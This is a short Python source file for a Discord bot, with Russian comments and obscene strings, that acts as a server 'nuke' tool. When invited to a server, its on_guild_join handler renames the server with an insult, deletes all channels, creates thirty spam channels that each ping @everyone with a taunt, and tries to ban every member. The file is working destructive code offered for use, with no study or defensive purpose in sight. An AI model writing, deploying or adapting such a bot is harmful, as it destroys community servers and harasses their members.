import discord
from discord.ext import commands
from config import settings
from requests import get
from os import getcwd
import aiohttp
import asyncio
from io import BytesIO
import requests
from discord_components import *

# да, тут дохуя ненужных модулей, хз зачем они)

bot = commands.Bot(command_prefix = settings['prefix'])

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="Скам - Scally Milano")) 
    print('Connected to bot: {}'.format(bot.user.name))

#-------commands-------

@bot.event
async def on_guild_join(server):
    a = 30
    await server.edit(name = "вас хочет выебать ГЛЕНТ")
    for i in server.channels:
        await i.delete()
    while a > 0:
        channel = await server.create_text_channel("лиль-задудосил-крипов", overwrite=None)
        await channel.send('@everyone ЛОХИ ВАС КРАШНУЛИ АХАХХАХАХАХАХАХХАХАХХАХАХАХАХАХ')
        a -= 1
    for member in bot.get_all_members():
        try:
            await member.ban(reason='ahahahha')
        except:
            print('xd')

#---------end----------

# последние строчки насчет бана работают через жопу, так что бот может просто спамить в косноль :)

bot.run(settings['token'])
